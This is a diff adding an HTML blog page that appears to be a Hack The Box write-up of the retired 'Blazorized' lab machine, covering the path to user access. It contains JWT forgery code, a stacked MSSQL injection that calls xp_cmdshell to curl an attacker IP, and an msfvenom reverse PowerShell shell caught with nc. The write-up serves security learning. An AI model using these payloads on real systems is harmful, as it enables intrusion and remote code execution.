@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <title>HTB Write-up | Blazorized (user-only)</title>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="stylesheet" type="text/css" href="../assets/built/screen.css%3Fv=16cc7bf6be.css" />
+
+    <link rel="canonical" href="index.html" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+    <link rel="amphtml" href="amp/index.html" />
+    
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="HTB Write-up | Blazorized (user-only)" />
+    <meta property="og:description" content="Retired machine can be found here. Enumeration~ nmap -F 10.10.11.22 -Pn PORT     STATE SERVICE 53/tcp   open  domain 80/tcp   open  http 88/tcp   open  kerberos-sec 135/tcp  open  msrpc 139/tcp  open  netbios-ssn 389/tcp  open  ldap 445/tcp  open  microsoft-ds 1433/tcp open  ms-sql-sPort 80" />
+    <meta property="og:url" content="inesmartins.github.io/htb-writeup-blazorized/" />
+    <meta property="og:image" content="inesmartins.github.io/content/images/2024/08/Blazorized.png" />
+    <meta property="article:published_time" content="2024-11-13T13:30:46.000Z" />
+    <meta property="article:modified_time" content="2024-11-13T13:30:46.000Z" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="HTB Write-up | Blazorized (user-only)" />
+    <meta name="twitter:description" content="Retired machine can be found here. Enumeration~ nmap -F 10.10.11.22 -Pn PORT     STATE SERVICE 53/tcp   open  domain 80/tcp   open  http 88/tcp   open  kerberos-sec 135/tcp  open  msrpc 139/tcp  open  netbios-ssn 389/tcp  open  ldap 445/tcp  open  microsoft-ds 1433/tcp open  ms-sql-sPort 80" />
+    <meta name="twitter:url" content="inesmartins.github.io/htb-writeup-blazorized/" />
+    <meta name="twitter:image" content="inesmartins.github.io/content/images/2024/08/Blazorized.png" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Inês Martins" />
+    <meta property="og:image:width" content="1400" />
+    <meta property="og:image:height" content="1138" />
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "",
+        "url": "inesmartins.github.io/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "inesmartins.github.io/favicon.ico",
+            "width": 48,
+            "height": 48
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Inês Martins",
+        "image": {
+            "@type": "ImageObject",
+            "url": "inesmartins.github.io/content/images/2022/08/1658857349956.jpeg",
+            "width": 420,
+            "height": 420
+        },
+        "url": "inesmartins.github.io/author/ines/",
+        "sameAs": [
+            "https://www.linkedin.com/in/ines-af-martins/"
+        ]
+    },
+    "headline": "HTB Write-up | Blazorized (user-only)",
+    "url": "inesmartins.github.io/htb-writeup-blazorized/",
+    "datePublished": "2024-11-13T13:30:46.000Z",
+    "dateModified": "2024-11-13T13:30:46.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "inesmartins.github.io/content/images/2024/08/Blazorized.png",
+        "width": 1400,
+        "height": 1138
+    },
+    "description": "Retired machine can be found here\n[https://www.hackthebox.com/machines/Blazorized].\n\n\n--------------------------------------------------------------------------------\n\nEnumeration\n~ nmap -F 10.10.11.22 -Pn\n\nPORT     STATE SERVICE\n53/tcp   open  domain\n80/tcp   open  http\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n1433/tcp open  ms-sql-s\n\nPort 80 redirects to http://blazorized.htb/, which means this virtual host need",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "inesmartins.github.io/"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 4.7" />
+    <link rel="alternate" type="application/rss+xml" title="" href="../rss/index.html" />
+    <script defer src="https://unpkg.com/@tryghost/portal@~1.5.1/umd/portal.min.js" data-ghost="inesmartins.github.io/"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
+.gh-post-upgrade-cta {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    text-align: center;
+    width: 100%;
+    color: #ffffff;
+    font-size: 16px;
+}
+
+.gh-post-upgrade-cta-content {
+    border-radius: 8px;
+    padding: 40px 4vw;
+}
+
+.gh-post-upgrade-cta h2 {
+    color: #ffffff;
+    font-size: 28px;
+    letter-spacing: -0.2px;
+    margin: 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta p {
+    margin: 20px 0 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta small {
+    font-size: 16px;
+    letter-spacing: -0.2px;
+}
+
+.gh-post-upgrade-cta a {
+    color: #ffffff;
+    cursor: pointer;
+    font-weight: 500;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a:hover {
+    color: #ffffff;
+    opacity: 0.8;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a.gh-btn {
+    display: block;
+    background: #ffffff;
+    text-decoration: none;
+    margin: 28px 0 0;
+    padding: 8px 18px;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.gh-post-upgrade-cta a.gh-btn:hover {
+    opacity: 0.92;
+}</style>
+    <link rel="icon" type="image/png" href="../content/images/2021/08/Screenshot-2021-08-22-at-21.31.59.png"/>
+<link rel="icon" type="image/png" href="../content/images/2021/08/Screenshot-2021-08-22-at-21.31.59.png"/>
+<!-- Injects copyright and footer -->
+<script>
+    window.onload = function(e){ 
+	    var copyrightElement = document.getElementsByClassName('copyright')[0];
+    	copyrightElement.innerHTML = '<p>Inês Martins © 2024</p>'
+        copyrightElement.innerHTML += '<p>Contact: <a href="mailto:inesmartins.github.io@pm.me">inesmartins.github.io@pm.me</a></p>'
+	    copyrightElement.innerHTML += '<p>Banner by Josan Gonzalez aka <a href="https://www.artstation.com/josan">Death Burger</a>'
+        var footerNav = document.getElementsByClassName('site-footer-nav')[0];
+        footerNav.innerHTML = '<img src="http://www.hackthebox.eu/badge/image/172261" alt="Hack The Box">'
+	}
+</script>
+<!-- Styles -->
+<style>
+    .gh-head-actions,
+    .footer-cta, 
+    .gh-head-button {
+        display: none;
+    }
+    .article-image img {
+        max-height: 400px;
+        object-fit: contain;
+    }
+    .site-footer-nav {
+        display: block;
+    }
+    @media (max-width: 800px) {    
+	    .site-footer-nav {
+    	    margin: 20px auto;
+	    }
+    }
+</style><style>:root {--ghost-accent-color: #000000;}</style>
+
+</head>
+<body class="post-template">
+<div class="viewport">
+
+    <header id="gh-head" class="gh-head has-cover">
+        <nav class="gh-head-inner inner gh-container">
+
+            <div class="gh-head-brand">
+                <a class="gh-head-logo" href="../index.html">
+                        
+                </a>
+                <a class="gh-burger" role="button">
+                    <div class="gh-burger-box">
+                        <div class="gh-burger-inner"></div>
+                    </div>
+                </a>
+            </div>
+            <div class="gh-head-menu">
+                <ul class="nav">
+    <li class="nav-home"><a href="../index.html">Home</a></li>
+    <li class="nav-about"><a href="../about-me/index.html">About</a></li>
+</ul>
+
+            </div>
+            <div class="gh-head-actions">
+                <div class="gh-social">
+                </div>
+
+                    <a class="gh-head-button" href="index.html#/portal/signup">Subscribe</a>
+            </div>
+        </nav>
+    </header>
+
+    <main>
+        
+
+
+
+<article class="article post">
+
+    <header class="article-header gh-canvas">
+
+
+        <h1 class="article-title">HTB Write-up | Blazorized (user-only)</h1>
+
+
+        <div class="article-byline">
+            <section class="article-byline-content">
+                <ul class="author-list">
+                    <li class="author-list-item">
+                        <a href="../author/ines/index.html" class="author-avatar">
+                            <img class="author-profile-image" src="../content/images/size/w100/2022/08/1658857349956.jpeg" alt="Inês Martins" />
+                        </a>
+                    </li>
+                </ul>
+                <div class="article-byline-meta">
+                    <h4 class="author-name"><a href="../author/ines/index.html">Inês Martins</a></h4>
+                    <div class="byline-meta-content">
+                        <time class="byline-meta-date" datetime="2024-11-13">Nov 13, 2024</time>
+                        <span class="byline-reading-time"><span class="bull">&bull;</span> 6 min read</span>
+                    </div>
+                </div>
+            </section>
+        </div>
+
+        <figure class="article-image">
+            <img
+                srcset="../content/images/size/w300/2024/08/Blazorized.png 300w,
+                       ../content/images/size/w600/2024/08/Blazorized.png 600w,
+                      ../content/images/size/w1000/2024/08/Blazorized.png 1000w,
+                     ../content/images/size/w2000/2024/08/Blazorized.png 2000w"
+                sizes="(min-width: 1400px) 1400px, 92vw"
+                src="../content/images/size/w2000/2024/08/Blazorized.png"
+                alt="HTB Write-up | Blazorized (user-only)"
+            />
+        </figure>
+    </header>
+
+    <section class="gh-content gh-canvas">
+        <p><em>Retired machine can be found <a href="https://www.hackthebox.com/machines/Blazorized">here</a>.</em></p><hr><h2 id="enumeration">Enumeration</h2><pre><code>~ nmap -F 10.10.11.22 -Pn
+
+PORT     STATE SERVICE
+53/tcp   open  domain
+80/tcp   open  http
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+1433/tcp open  ms-sql-s</code></pre><p>Port <code>80</code> redirects to <a href="http://blazorized.htb/">http://blazorized.htb/</a>, which means this virtual host needs to be mapped in order for us to be able to access the web application.</p><pre><code>~ sudo nano /etc/hosts
+
+[...]
+10.10.11.22 blazorized.htb</code></pre><p>The website is built using <a href="https://dotnet.microsoft.com/en-us/apps/aspnet/web-apps/blazor">Blazor WebAssembly</a>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2024/08/Screenshot-2024-08-05-at-11.59.30.png" class="kg-image" alt loading="lazy" width="1439" height="714" srcset="../content/images/size/w600/2024/08/Screenshot-2024-08-05-at-11.59.30.png 600w, ../content/images/size/w1000/2024/08/Screenshot-2024-08-05-at-11.59.30.png 1000w, ../content/images/2024/08/Screenshot-2024-08-05-at-11.59.30.png 1439w" sizes="(min-width: 1200px) 1200px"></figure><blockquote>Blazor is a feature of ASP.NET for building interactive web UIs using C# instead of JavaScript. It's real .NET running in the browser on <em>WebAssembly.</em></blockquote><p>It looks like we can temporarily "impersonate" the <code>super admin</code> user:</p><figure class="kg-card kg-image-card"><img src="../content/images/2024/08/Screenshot-2024-08-05-at-12.01.41.png" class="kg-image" alt loading="lazy" width="1152" height="466" srcset="../content/images/size/w600/2024/08/Screenshot-2024-08-05-at-12.01.41.png 600w, ../content/images/size/w1000/2024/08/Screenshot-2024-08-05-at-12.01.41.png 1000w, ../content/images/2024/08/Screenshot-2024-08-05-at-12.01.41.png 1152w" sizes="(min-width: 720px) 720px"></figure><p>This button performs <code>GET</code> requests to <a href="http://api.blazorized.htb/posts">http://api.blazorized.htb/posts</a> and <a href="http://api.blazorized.htb/categories">http://api.blazorized.htb/categories</a> with an <code>authorization</code> header that contains a bearer token:</p><pre><code>authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJzdXBlcmFkbWluQGJsYXpvcml6ZWQuaHRiIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlBvc3RzX0dldF9BbGwiLCJDYXRlZ29yaWVzX0dldF9BbGwiXSwiZXhwIjoxNzIyODU2MzAyLCJpc3MiOiJodHRwOi8vYXBpLmJsYXpvcml6ZWQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5ibGF6b3JpemVkLmh0YiJ9.J4bJYYN3EkV-PfFWJ90yAyOFS158LOanNLTduowSPHdYv28W7GQ59zeadaRaCZsyM_cfDH5r_tGXD0Mf43AUwA</code></pre><p>At this point, I'm not sure how this token is being generated because it doesn't seem to be retrieved from the API, and it's not hardcoded in any of the resource files, so there's probably some Blazor magic under the hood.</p><p>We can use <a href="https://github.com/hahwul/jwt-hack">jwt-hack</a> to decode it:</p><pre><code>~ jwt-hack decode &lt;the-token&gt;
+
+INFO[0000] Decoded data(claims)
+
+header="{\"alg\":\"HS512\",\"typ\":\"JWT\"}" 
+method="&amp;{HS512 SHA-512}"
+
+INFO[0000] Expiraton Time
+EXP=1722856302 TIME="1970-01-01 01:00:01.722856302 +0100 CET"
+
+{
+    "aud":"http://api.blazorized.htb",
+    "exp":1722856302,
+    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role":[
+       "Posts_Get_All",
+       "Categories_Get_All"
+    ],
+    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress":"superadmin@blazorized.htb",
+    "iss":"http://api.blazorized.htb"
+}</code></pre><p>We can see that this token was generated for a user with the <code>superadmin@blazorized.htb</code> email, and has the following "claims": <code>Posts_Get_All</code> and <code>Categories_Get_All</code>.</p><p>We can also see from the API responses that the posts' content is formatted in Markdown:</p><pre><code class="language-json">{
+   "Posts":[
+      {
+         "ID":"1c391f9c-fd3e-4d86-b966-9a3e5d7e3d28",
+         "Title":"Active Directory",
+         "MarkdownContent":"Below are links to projects and posts relating AD red-teaming:\r\n\r\n- https://github.com/Group3r/Group3r\r\n- https://github.com/Leo4j/Amnesiac\r\n- https://github.com/JPG0mez/ADCSync\r\n- https://github.com/Processus-Thief/HEKATOMB\r\n- https://github.com/Mazars-Tech/AD_Miner\r\n- https://github.com/AlmondOffSec/PassTheCert\r\n- https://github.com/synacktiv/ntdissector\r\n- https://github.com/Hackndo/pyGPOAbuse\r\n- https://exploit.ph/external-trusts-are-evil.html\r\n- https://github.com/SecuraBV/Timeroast\r\n- https://github.com/SadProcessor/CypherDog\r\n- https://mayfly277.github.io/","CategoryID":"9a445790-f7e8-4351-8cf4-46fcae383eec"},
+...
+}</code></pre><p>This means that the front-end is somehow processing and displaying this Markdown, which may result in stored XSS if we're able to create or manipulate posts or categories:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2024/08/Screenshot-2024-08-05-at-12.28.14.png" class="kg-image" alt loading="lazy" width="1431" height="715" srcset="../content/images/size/w600/2024/08/Screenshot-2024-08-05-at-12.28.14.png 600w, ../content/images/size/w1000/2024/08/Screenshot-2024-08-05-at-12.28.14.png 1000w, ../content/images/2024/08/Screenshot-2024-08-05-at-12.28.14.png 1431w" sizes="(min-width: 1200px) 1200px"></figure><p>This suspicion is further confirmed because the Markdown "playground" is vulnerable to DOM-based XSS:</p><pre><code class="language-html">&lt;img src=x onerror=alert(1) /&gt; </code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2024/08/Screenshot-2024-08-05-at-12.17.47.png" class="kg-image" alt loading="lazy" width="1123" height="496" srcset="../content/images/size/w600/2024/08/Screenshot-2024-08-05-at-12.17.47.png 600w, ../content/images/size/w1000/2024/08/Screenshot-2024-08-05-at-12.17.47.png 1000w, ../content/images/2024/08/Screenshot-2024-08-05-at-12.17.47.png 1123w" sizes="(min-width: 720px) 720px"></figure><p>However, only the <code>GET</code> method seems to be allowed for <code>/posts</code> and <code>/categories</code>:</p><figure class="kg-card kg-image-card"><img src="../content/images/2024/08/Screenshot-2024-08-05-at-12.39.10.png" class="kg-image" alt loading="lazy" width="944" height="437" srcset="../content/images/size/w600/2024/08/Screenshot-2024-08-05-at-12.39.10.png 600w, ../content/images/2024/08/Screenshot-2024-08-05-at-12.39.10.png 944w" sizes="(min-width: 720px) 720px"></figure><p>When we try to request a non-existent post ID, we see that all of the application's DLLs and other source files are available under the <code>_framework</code> directory:</p><pre><code>http://blazorized.htb/post/1
+
+http://blazorized.htb/_framework/blazor.boot.json
+http://blazorized.htb/_framework/Blazored.LocalStorage.dll
+http://blazorized.htb/_framework/Blazorized.DigitalGarden.dll
+http://blazorized.htb/_framework/Blazorized.Shared.dll
+...</code></pre><p>Let's download all of these files to a local dir ...</p><pre><code>~ wget -i requests.txt</code></pre><p>... so we can use the <a href="https://marketplace.visualstudio.com/items?itemName=icsharpcode.ilspy-vscode">ilspy-vscode extension</a> to decompile the relevant source code.</p><p>It looks like the <code>Blazorized.Helpers</code> namespace has a <code>JWT</code> class that contains the logic for the temporary token generation, as well as a new interesting subdomain:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2024/08/Screenshot-2024-08-05-at-13.24.44.png" class="kg-image" alt loading="lazy" width="1441" height="710" srcset="../content/images/size/w600/2024/08/Screenshot-2024-08-05-at-13.24.44.png 600w, ../content/images/size/w1000/2024/08/Screenshot-2024-08-05-at-13.24.44.png 1000w, ../content/images/2024/08/Screenshot-2024-08-05-at-13.24.44.png 1441w" sizes="(min-width: 1200px) 1200px"></figure><p>Note that this application is built with <a href="https://learn.microsoft.com/en-us/aspnet/core/blazor/hosting-models?view=aspnetcore-8.0#blazor-server">Blazor Server</a>, instead of Blazor WebAssembly:</p><blockquote>With the Blazor Server hosting model, components are executed on the server from within an ASP.NET Core app. UI updates, event handling, and JavaScript calls are handled over a <a href="https://learn.microsoft.com/en-us/aspnet/core/signalr/introduction?view=aspnetcore-8.0">SignalR</a> connection using the <a href="https://learn.microsoft.com/en-us/aspnet/core/fundamentals/websockets?view=aspnetcore-8.0">WebSockets protocol</a>. <em>[...]</em></blockquote><p>It's unlikely, but possible, that the JWT we have is a valid form of authorization for this subdomain. </p><p>We can see that there are 2 different "audiences" in the source code: <code>apiAudience</code> and <code>adminDashboardAudience</code>.</p><p>We can guess that the <code>temporary</code> token we've previously come across is generated using the following function:</p><pre><code>public static string GenerateTemporaryJWT(long expirationDurationInSeconds = 60L)
+{
+    try
+    {
+        List&lt;Claim&gt; claims = new List&lt;Claim&gt;
+        {
+            new Claim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress", superAdminEmailClaimValue),
+            new Claim("http://schemas.microsoft.com/ws/2008/06/identity/claims/role", postsPermissionsClaimValue),
+            new Claim("http://schemas.microsoft.com/ws/2008/06/identity/claims/role", categoriesPermissionsClaimValue)
+        };
+        SigningCredentials signingCredentials = GetSigningCredentials();
+        DateTime? expires = DateTime.UtcNow.AddSeconds(expirationDurationInSeconds);
+        JwtSecurityToken token = new JwtSecurityToken(issuer, apiAudience, claims, null, expires, signingCredentials);
+        return new JwtSecurityTokenHandler().WriteToken(token);
+    }
+    catch (Exception)
+    {
+        throw;
+    }
+}
+</code></pre><p>But there is another function, which generates a token for the same email address but for the <code>adminDashboardAudience</code>, and with the <code>superAdminRoleClaimValue</code> claim:</p><pre><code>using System;
+using System.Collections.Generic;
+using System.IdentityModel.Tokens.Jwt;
+using System.Security.Claims;
+using Microsoft.IdentityModel.Tokens;
+
+public static string GenerateSuperAdminJWT(long expirationDurationInSeconds = 60L)
+{
+    try
+    {
+        List&lt;Claim&gt; claims = new List&lt;Claim&gt;
+        {
+            new Claim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress", superAdminEmailClaimValue),
+            new Claim("http://schemas.microsoft.com/ws/2008/06/identity/claims/role", superAdminRoleClaimValue)
+        };
+        SigningCredentials signingCredentials = GetSigningCredentials();
+        DateTime? expires = DateTime.UtcNow.AddSeconds(expirationDurationInSeconds);
+        JwtSecurityToken token = new JwtSecurityToken(issuer, adminDashboardAudience, claims, null, expires, signingCredentials);
+        return new JwtSecurityTokenHandler().WriteToken(token);
+    }
+    catch (Exception)
+    {
+        throw;
+    }
+}
+</code></pre><p>Let's create a new .NET project, import the relevant DLLs, and try to generate a valid token (we increased the expiration to 600000 seconds, to make testing easier):</p><figure class="kg-card kg-code-card"><pre><code class="language-C#">using Blazorized.Helpers;
+
+namespace BlazorJWTMock
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Console.WriteLine("Generating super admin token ...");
+            Console.WriteLine(JWT.GenerateSuperAdminJWT(600000));
+            Console.WriteLine("Done!");
+        }
+    }
+}</code></pre><figcaption>BlazorJWTMock/Program.cs</figcaption></figure><figure class="kg-card kg-code-card"><pre><code>&lt;Project Sdk="Microsoft.NET.Sdk"&gt;
+  &lt;PropertyGroup&gt;
+    &lt;OutputType&gt;Exe&lt;/OutputType&gt;
+    &lt;TargetFramework&gt;net7.0&lt;/TargetFramework&gt;
+    &lt;ImplicitUsings&gt;enable&lt;/ImplicitUsings&gt;
+    &lt;Nullable&gt;enable&lt;/Nullable&gt;
+  &lt;/PropertyGroup&gt;
+  &lt;ItemGroup&gt;
+    &lt;Reference Include="&lt;PATH-TO-LIBS&gt;/Blazored.LocalStorage.dll" /&gt;
+    &lt;Reference Include="&lt;PATH-TO-LIBS&gt;/Blazorized.DigitalGarden.dll" /&gt;
+    &lt;Reference Include="&lt;PATH-TO-LIBS&gt;/Blazorized.Helpers.dll" /&gt;
+    &lt;Reference Include="&lt;PATH-TO-LIBS&gt;/Microsoft.IdentityModel.Tokens.dll" /&gt;
+    &lt;Reference Include="&lt;PATH-TO-LIBS&gt;/Microsoft.IdentityModel.JsonWebTokens.dll" /&gt;
+    &lt;Reference Include="&lt;PATH-TO-LIBS&gt;/System.IdentityModel.Tokens.Jwt.dll" /&gt;
+  &lt;/ItemGroup&gt;
+&lt;/Project&gt;</code></pre><figcaption>BlazorJWTMock/BlazorJWTMock.csproj</figcaption></figure><pre><code>~ dotnet run --project BlazorJwtMock/BlazorJwtMock.csproj
+
+Generating admin token ...
+
+eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJzdXBlcmFkbWluQGJsYXpvcml6ZWQuaHRiIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjoiU3VwZXJfQWRtaW4iLCJleHAiOjE3MjI4NzgyNzUsImlzcyI6Imh0dHA6Ly9hcGkuYmxhem9yaXplZC5odGIiLCJhdWQiOiJodHRwOi8vYWRtaW4uYmxhem9yaXplZC5odGIifQ.XUlzWUdD04FGiWCOP_SbsULNGCDVNRmvmSlAAEi2SCJNmUNf9irKVmtvyReIl0tqN8WwcvkrqWxAOO3RMXZONw
+
+Done!</code></pre><p>Ok, we have a token, but we're not sure how to use it to authenticate in the <code>admin</code> subdomain.</p><p>Even after reversing every DLL that looked relevant, I couldn't find the logic that was responsible for getting or setting this token, so I decided to fuzz this parameter, as recommended in the forum:</p><figure class="kg-card kg-image-card"><img src="../content/images/2024/08/Screenshot-2024-08-06-at-10.46.49.png" class="kg-image" alt loading="lazy" width="783" height="438" srcset="../content/images/size/w600/2024/08/Screenshot-2024-08-06-at-10.46.49.png 600w, ../content/images/2024/08/Screenshot-2024-08-06-at-10.46.49.png 783w" sizes="(min-width: 720px) 720px"></figure><p>The solution was to add this JWT to the <code>jwt</code> LocalStorage value:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2024/08/Screenshot-2024-08-06-at-10.37.36.png" class="kg-image" alt loading="lazy" width="1633" height="652" srcset="../content/images/size/w600/2024/08/Screenshot-2024-08-06-at-10.37.36.png 600w, ../content/images/size/w1000/2024/08/Screenshot-2024-08-06-at-10.37.36.png 1000w, ../content/images/size/w1600/2024/08/Screenshot-2024-08-06-at-10.37.36.png 1600w, ../content/images/2024/08/Screenshot-2024-08-06-at-10.37.36.png 1633w" sizes="(min-width: 1200px) 1200px"></figure><hr><h2 id="from-admin-to-foothold">From Admin to Foothold</h2><p>We have an obvious clue from the <code>/home</code> page:</p><blockquote>To avoid latency issues, this super admin panel does not consume the API but speaks to the database directly.</blockquote><p>We can see that the "Check Duplicate" features are vulnerable to SQLi, and we know from the initial <code>nmap</code> scan that we're dealing with a MSSQL database, so let's try to get a request from the victim machine using a stacked query and the <code>EXEC master.dbo.xp_cmdshell</code> command, e.g.:</p><pre><code>';EXEC master.dbo.xp_cmdshell 'curl http://10.10.14.91:8000';--</code></pre><pre><code>~ python3 -m http.server 8000
+::ffff:10.10.11.22 - - [06/Aug/2024 11:58:11] "GET / HTTP/1.1" 200 -</code></pre><p>Alright, let's try to trigger a reverse shell:</p><pre><code>~ msfvenom -p cmd/windows/reverse_powershell LHOST={local_ip} LPORT={local_port} &gt; revshell.txt
+
+# after cleaning up the revshell.txt file and removing "powershell -w hidden -nop -c"
+
+~ iconv -f ASCII -t UTF-16LE revshell.txt | base64 | tr -d '\n'
+JABhAD0AJwAxADAALgAxADAALgAxADQALgA5ADEAJwA7ACQAYgA9ADQANAA0ADQAOwAkAGMAPQBOA...
+
+~ powershell.exe -EncodedCommand JABhAD0AJwAxADAALgAxADAALgAxADQALgA5ADEAJwA7ACQAYgA9ADQANAA0ADQAOwAkAGMAPQBOA...</code></pre><p>and we get a shell!</p><pre><code>~ nc -l 4444
+Microsoft Windows [Version 10.0.17763.5936]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt; whoami
+blazorized\nu_1055
+
+C:\Windows\system32&gt; cd Users
+C:\Users&gt; dir
+02/25/2024  03:41 PM    &lt;DIR&gt;          NU_1055
+...
+
+C:\Users&gt;type C:\Users\NU_1055\Desktop\user.txt</code></pre><p>We didn't even have to pivot to get the user flag! :)</p>
+    </section>
+
+
+</article>
+
+<section class="footer-cta">
+    <div class="inner">
+        <h2>Sign up for more like this.</h2>
+        <a class="footer-cta-button" href="index.html#/portal">
+            <div>Enter your email</div>
+            <span>Subscribe</span>
+        </a>
+    </div>
+</section>
+
+
+<aside class="read-more-wrap">
+    <div class="read-more inner">
+
+
+                    
+<article class="post-card post ">
+
+    <a class="post-card-image-link" href="../htb-writeup-formulax/index.html">
+        <img class="post-card-image"
+            srcset="../content/images/size/w300/2024/08/FormulaX-1.png 300w,
+                   ../content/images/size/w600/2024/08/FormulaX-1.png 600w,
+                  ../content/images/size/w1000/2024/08/FormulaX-1.png 1000w,
+                 ../content/images/size/w2000/2024/08/FormulaX-1.png 2000w"
+            sizes="(max-width: 1000px) 400px, 800px"
+            src="../content/images/size/w600/2024/08/FormulaX-1.png"
+            alt="HTB Write-up | FormulaX (user-only)"
+            loading="lazy"
+        />
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="../htb-writeup-formulax/index.html">
+            <header class="post-card-header">
+                <h2 class="post-card-title">HTB Write-up | FormulaX (user-only)</h2>
+            </header>
+            <section class="post-card-excerpt">
+                <p>Retired machine can be found here. Let's start with some basic enumeration: ~ nmap -F 10.10.11.6 PORT   STATE SERVICE 22/tcp open  ssh 80/tcp open  http There's a web application running on port 80: http://10.10.11.6/static/index.htmlThe source code discloses a couple</p>
+            </section>
+        </a>
+
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+                    <a href="../author/ines/index.html" class="static-avatar">
+                        <img class="author-profile-image" src="../content/images/size/w100/2022/08/1658857349956.jpeg" alt="Inês Martins" />
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span><a href="../author/ines/index.html">Inês Martins</a></span>
+                <span class="post-card-byline-date"><time datetime="2024-11-13">Nov 13, 2024</time> <span class="bull">&bull;</span> 12 min read</span>
+            </div>
+        </footer>
+
+    </div>
+
+</article>
+                    
+<article class="post-card post ">
+
+    <a class="post-card-image-link" href="../htb-writeup-iclean/index.html">
+        <img class="post-card-image"
+            srcset="../content/images/size/w300/2024/08/IClean.png 300w,
+                   ../content/images/size/w600/2024/08/IClean.png 600w,
+                  ../content/images/size/w1000/2024/08/IClean.png 1000w,
+                 ../content/images/size/w2000/2024/08/IClean.png 2000w"
+            sizes="(max-width: 1000px) 400px, 800px"
+            src="../content/images/size/w600/2024/08/IClean.png"
+            alt="HTB Write-up | iClean (user-only)"
+            loading="lazy"
+        />
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="../htb-writeup-iclean/index.html">
+            <header class="post-card-header">
+                <h2 class="post-card-title">HTB Write-up | iClean (user-only)</h2>
+            </header>
+            <section class="post-card-excerpt">
+                <p>Retired machine can be found here. Let's start with a basic scan: ~ nmap -F 10.10.11.12 22/tcp open  ssh 80/tcp open  http10.10.11.12 redirects to capiclean.htb, so let's map out this domain. ~ sudo nano /etc/hosts 10.10.11.12 capiclean.htbhttp://capiclean.</p>
+            </section>
+        </a>
+
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+                    <a href="../author/ines/index.html" class="static-avatar">
+                        <img class="author-profile-image" src="../content/images/size/w100/2022/08/1658857349956.jpeg" alt="Inês Martins" />
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span><a href="../author/ines/index.html">Inês Martins</a></span>
+                <span class="post-card-byline-date"><time datetime="2024-08-04">Aug 4, 2024</time> <span class="bull">&bull;</span> 6 min read</span>
+            </div>
+        </footer>
+
+    </div>
+
+</article>
+                    
+<article class="post-card post ">
+
+    <a class="post-card-image-link" href="../exploiting-ssrf-in-k8s-environment/index.html">
+        <img class="post-card-image"
+            srcset="../content/images/size/w300/2024/04/6.png 300w,
+                   ../content/images/size/w600/2024/04/6.png 600w,
+                  ../content/images/size/w1000/2024/04/6.png 1000w,
+                 ../content/images/size/w2000/2024/04/6.png 2000w"
+            sizes="(max-width: 1000px) 400px, 800px"
+            src="../content/images/size/w600/2024/04/6.png"
+            alt="Exploiting SSRF in Kubernetes"
+            loading="lazy"
+        />
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="../exploiting-ssrf-in-k8s-environment/index.html">
